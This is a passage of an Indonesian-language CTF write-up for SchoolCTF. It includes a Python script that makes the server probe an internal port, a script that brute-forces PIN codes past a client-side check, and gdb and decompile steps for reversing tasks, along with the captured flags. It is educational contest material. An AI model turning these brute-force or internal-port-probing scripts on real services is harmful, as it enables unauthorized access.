&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; struct &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; unpack
&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; re

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;ip2long&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;ip&lt;/span&gt;):
    aton &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; inet_aton(ip)
    &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; unpack(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;!L&quot;&lt;/span&gt;,aton)[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;main&lt;/span&gt;():
    URL &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;http://portscan.task.school-ctf.org/port&quot;&lt;/span&gt;
    IP &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;
    HOST &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; ip2long(IP)
    PORT &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;31337&quot;&lt;/span&gt;
    &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Host : {}&quot;&lt;/span&gt;.format(HOST)
    r &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; requests.post(URL,&lt;span style=&quot;color:#3e87e3;&quot;&gt;data&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;{&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;host&quot;&lt;/span&gt; : HOST,&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;port&quot;&lt;/span&gt; : PORT})
    raw_content &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; r.content
    flag &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; re.findall(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;SchoolCTF{.*?}&quot;&lt;/span&gt;,raw_content)
    &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Flag : {}&quot;&lt;/span&gt;.format(flag[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;])
&lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;__name__&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'__main__'&lt;/span&gt;:
    main()
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : SchoolCTF{$c@N-^^3&lt;em&gt;@11&lt;/em&gt;@r0unD}&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Web400 (Pin Code)&lt;/h2&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;We overheard the talk between hacker Frank and his partner William!
It seems they have hidden something important in the safe, can you open it?

p.s. It seems that one of them said that they haven't yet fully configured the security system and the password can be cracked.
&lt;a href=&quot;http://pincode.task.school-ctf.org/&quot;&gt;Safe URL&lt;/a&gt;
&lt;/pre&gt;
&lt;p&gt;Situs tersebut adalah situs “Pin code validation” dimana harus memasukan PIN yang benar untuk mendapatkan Flag.&lt;/p&gt;

&lt;p&gt;Dari hasil inspect element didapatkan code berikut&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;      &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (input.&lt;span style=&quot;color:#cf6a4c;&quot;&gt;length&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt;) {
                &lt;span style=&quot;color:#99cf50;&quot;&gt;var&lt;/span&gt; captcha &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; grecaptcha.getResponse();
                &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (captcha.&lt;span style=&quot;color:#cf6a4c;&quot;&gt;length&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;) {
                    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (isValid(input)) {
                        &lt;span style=&quot;color:#e28964;&quot;&gt;$&lt;/span&gt;.ajax({
                            type: &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;POST&quot;&lt;/span&gt;,
                            url: &lt;span style=&quot;color:#65b042;&quot;&gt;'/api/check'&lt;/span&gt;,
                            data: {&lt;span style=&quot;color:#65b042;&quot;&gt;'key'&lt;/span&gt;: input, &lt;span style=&quot;color:#65b042;&quot;&gt;'captcha'&lt;/span&gt;: captcha},
                            &lt;span style=&quot;color:#89bdff;&quot;&gt;success&lt;/span&gt;: &lt;span style=&quot;color:#99cf50;&quot;&gt;function&lt;/span&gt;(data){displayAnswer(data)},
                        });
                    } &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt; {
                        displayAnswer({&lt;span style=&quot;color:#65b042;&quot;&gt;'body'&lt;/span&gt;: &lt;span style=&quot;color:#65b042;&quot;&gt;'wrong'&lt;/span&gt;})
                    }
                } &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt; {
                    showError(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Please pass the CAPTCHA challenge&quot;&lt;/span&gt;)
                }
&lt;/pre&gt;
&lt;p&gt;Dari code diatas diketahui bahwa panjang pin harus &amp;gt;= 4, panjang capcha &amp;gt; 0 dan fungsi isValid harus bernilai True agar pin dapat di proses untuk validasi.&lt;/p&gt;

&lt;p&gt;Berikut fungsi isValid&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;        &lt;span style=&quot;color:#99cf50;&quot;&gt;function&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;isValid&lt;/span&gt;(code) {
            &lt;span style=&quot;color:#99cf50;&quot;&gt;var&lt;/span&gt; d0 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;parseInt&lt;/span&gt;(code[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]),
                d1 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;parseInt&lt;/span&gt;(code[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]),
                d2 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;parseInt&lt;/span&gt;(code[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;]),
                d3 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;parseInt&lt;/span&gt;(code[&lt;span style=&quot;color:#3387cc;&quot;&gt;3&lt;/span&gt;]);
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; (d0&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;d1&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;d2)&lt;span style=&quot;color:#e28964;&quot;&gt;%&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;10&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; d3
        }

&lt;/pre&gt;
&lt;p&gt;Agar fungsi isValid mereturn True, (pin ke 1 + pin ke 2 + pin ke 3) % 10 harus == pin ke 4&lt;/p&gt;

&lt;p&gt;Berikut script yang saya gunakan untuk mendapatkan PIN yang valid.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; requests
&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; itertools &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; permutations, product
URL &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;http://pincode.task.school-ctf.org/api/check&quot;&lt;/span&gt;

&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;a&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;pin&lt;/span&gt;):
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#9b859d;&quot;&gt;int&lt;/span&gt;(pin[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]) &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;int&lt;/span&gt;(pin[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]) &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;int&lt;/span&gt;(pin[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;])) &lt;span style=&quot;color:#e28964;&quot;&gt;%&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;10&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;int&lt;/span&gt;(pin[&lt;span style=&quot;color:#3387cc;&quot;&gt;3&lt;/span&gt;]):
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; pin
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;None&lt;/span&gt;
pin_list &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; []
prod_pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; product(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;123456789&quot;&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt;repeat&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt;)
prod_pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; [&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(x) &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; x &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;list&lt;/span&gt;(prod_pin)]
prod_pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;map&lt;/span&gt;(a,prod_pin)
prod_pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;filter&lt;/span&gt;(&lt;span style=&quot;color:#3387cc;&quot;&gt;None&lt;/span&gt;,prod_pin)
prod_pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;list&lt;/span&gt;(&lt;span style=&quot;color:#9b859d;&quot;&gt;set&lt;/span&gt;(prod_pin))
pin_list&lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt;prod_pin

&lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; pin &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; pin_list:
    pin &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;.join(pin)
    r &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;requests.post(URL,&lt;span style=&quot;color:#3e87e3;&quot;&gt;data&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;{&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;key&quot;&lt;/span&gt; : pin, &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;captcha&quot;&lt;/span&gt; : &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;SEMBARANGAJA&quot;&lt;/span&gt;})
    resp &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; r.content
    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;wrong&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;in&lt;/span&gt; resp:
        &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Wrong {}&quot;&lt;/span&gt;.format(pin)
        &lt;span style=&quot;color:#e28964;&quot;&gt;continue&lt;/span&gt;
    &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
        &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found pin {}&quot;&lt;/span&gt;.format(pin)
        &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found pin {}&quot;&lt;/span&gt;.format(pin)
        &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Found pin {}&quot;&lt;/span&gt;.format(pin)
        &lt;span style=&quot;color:#e28964;&quot;&gt;break&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;setelah dijalankan didapatkan PIN yang valid adalah : &lt;strong&gt;6444&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Submit PIN lalu akan mendapatkan Flag.
&lt;strong&gt;Flag : SchoolCTF{n0_6rut3f0rc3_0n_CTF//mkey?}&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Reversing&lt;/h1&gt;
&lt;h2&gt;Rev100 (Incorrect Pointer)&lt;/h2&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;The confrontation history of the evil hacker vs admin Tom has finally come to the end.
After twenty-eight hours of continuous battle, Tom finished a quantum automatic machine, decrypted all the data on the disk, but passed out from the exhaustion.
While Mary was waking Tom up, we started the machine and realized that Tom made an unfortunate mistake there. Help us to fix it!

&lt;a href=&quot;https://school-ctf.org/files/source_2db04ad72496a13f2cf7afed1b558f5d682257c5&quot;&gt;Task.elf&lt;/a&gt;
&lt;/pre&gt;
&lt;p&gt;Diberikan file ELF Binary 64 bit not stripped.
Apabila dijalankan akan mengluarkan string aneh&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ ./source_2db04ad72496a13f2cf7afed1b558f5d682257c5                                                                                                                &lt;span style=&quot;color:#e28964;&quot;&gt;~&lt;/span&gt;/Downloads  0,002s
h�&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;��&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;Mx��M��&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;�x�v&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;~&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;
 ��ull&lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;Lansung saja debug menggunakan GDB. Berikut disassamble fungsi main.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;gdb-peda$ pdisass main
Dump of assembler code &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;function&lt;/span&gt; main:
   0x00000000004043cb &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;0&amp;gt;&lt;/span&gt;: sub    rsp,0x18
   0x00000000004043cf &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;4&amp;gt;&lt;/span&gt;: mov    DWORD PTR [rsp+0xc],edi
   0x00000000004043d3 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;8&amp;gt;&lt;/span&gt;: mov    QWORD PTR [rsp],rsi
   0x00000000004043d7 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;12&amp;gt;&lt;/span&gt;:    mov    rsi,rsp
   0x00000000004043da &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;15&amp;gt;&lt;/span&gt;:    lea    rdi,[rsp+0xc]
   0x00000000004043df &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;20&amp;gt;&lt;/span&gt;:    call   0x458960 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;hs_init&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;
   0x00000000004043e4 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;25&amp;gt;&lt;/span&gt;:    mov    edi,0x7a3090
   0x00000000004043e9 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;30&amp;gt;&lt;/span&gt;:    call   0x4589e0 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;hs_add_root&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;
   0x00000000004043ee &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;35&amp;gt;&lt;/span&gt;:    mov    edi,0x7a31a0
   0x00000000004043f3 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;40&amp;gt;&lt;/span&gt;:    call   0x4042c5 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;decrypt&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;
   0x00000000004043f8 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;45&amp;gt;&lt;/span&gt;:    mov    edi,0x7a3160
   0x00000000004043fd &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;50&amp;gt;&lt;/span&gt;:    call   0x4aadd0 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;puts&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0000000000404402 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;55&amp;gt;&lt;/span&gt;:    call   0x458a00 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;hs_exit&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0000000000404407 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;60&amp;gt;&lt;/span&gt;:    mov    eax,0x0
   0x000000000040440c &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;65&amp;gt;&lt;/span&gt;:    add    rsp,0x18
   0x0000000000404410 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;69&amp;gt;&lt;/span&gt;:    ret    
End of assembler dump.

&lt;/pre&gt;
&lt;p&gt;Bagian paling menarik adalah intruksi berikut&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;   0x00000000004043ee &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;35&amp;gt;&lt;/span&gt;:    mov    edi,0x7a31a0
   0x00000000004043f3 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span style=&quot;color:#e28964;&quot;&gt;40&amp;gt;&lt;/span&gt;:    call   0x4042c5 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;decrypt&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;Dimana nilai yang berada di 0x7a31a0 akan dimove ke edi yang akan menjadi argument pertama untuk fungsi decrypt.&lt;/p&gt;

&lt;p&gt;Karena nama soal nya adalah incorrect pointer, tujuan utama nya adalah untuk mengganti argument fungsi decrypt yang awal nya not_flag menjadi flag.Sehingga nilai dari variable “flag” yang di encrypt dapat ter decrypt.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;gdb-peda$ x/x 0x7a31a0
0x7a31a0 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;not_flag&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;:    0xef0a5423
gdb-peda$ x/x &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;amp;&lt;/span&gt;flag
0x7a3160 &lt;span style=&quot;color:#e28964;&quot;&gt;&amp;lt;&lt;/span&gt;flag&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt;:    0x3c0dc966
&lt;/pre&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;gdb-peda$ b &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;0x00000000004043f3
Breakpoint 1 at 0x4043f3
gdb-peda$ r
gdb-peda$ &lt;span style=&quot;color:#dad085;&quot;&gt;set&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;$edi&lt;/span&gt;=&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;amp;&lt;/span&gt;flag
gdb-peda$ c
Continuing.
SchoolCTF{d0_u_m@k3_M1&lt;span style=&quot;color:#3e87e3;&quot;&gt;$T&lt;/span&gt;@ke&lt;span style=&quot;color:#3e87e3;&quot;&gt;$_&lt;/span&gt;As_1_d0}

&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : SchoolCTF{d0_u_m@k3_M1$T@ke$_As_1_d0}&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Rev300 (Brute me all night long)&lt;/h2&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;Brute me all night long
Mr. Hashenberg is a very forgetful person, so he always uses his notepad to leave some notes. 
Recently he's lost several pages, could you help him to recover?

&lt;a href=&quot;https://school-ctf.org/files/bruteme_75b59ed0692fe72c69b31c633fdb06c10c0d4b85.exe&quot;&gt;BruteMe.exe&lt;/a&gt;
&lt;/pre&gt;
&lt;p&gt;Diberikan sebuah binary .NET&lt;/p&gt;

&lt;p&gt;Berikut hasil decompile menggunakan ILSPY&lt;/p&gt;

&lt;p&gt;Fungsi Main&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;// MD5Sample.SchoolCTF
&lt;span style=&quot;color:#99cf50;&quot;&gt;public&lt;/span&gt; static &lt;span style=&quot;color:#e28964;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Main&lt;/span&gt;&lt;/span&gt;()
{
    Process &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Why'd&quot;&lt;/span&gt;);
    &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
    {
        &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
        &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetMd5Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;16c222aa19898e5058938167c8ab6c57&quot;&lt;/span&gt;) 
        {
            SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
        }
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
        {
            &lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetNotepadWindow&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Y0u&quot;&lt;/span&gt;);
            &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt; null&lt;/span&gt;)
            {
                &lt;span style=&quot;color:#dad085;&quot;&gt;string&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;text2&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetText&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;notepadWindow&lt;/span&gt;);
                &lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; (SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;GetSha384Hash&lt;/span&gt;&lt;/span&gt;(&lt;span style=&quot;color:#3e87e3;&quot;&gt;text2&lt;/span&gt;) &lt;span style=&quot;color:#e28964;&quot;&gt;!&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;71036b1049de3e6627aa06ef7af933cc460996fdd7ffa9872bf4881e8d10a9c3153c8413ca4cd300a04e81e38d55d327&quot;&lt;/span&gt;)
                {
                    SchoolCTF.&lt;span style=&quot;color:#dad085;&quot;&gt;&lt;span style=&quot;color:#89bdff;&quot;&gt;Fail&lt;/span&gt;&lt;/span&gt;();
                }
                &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;
                {
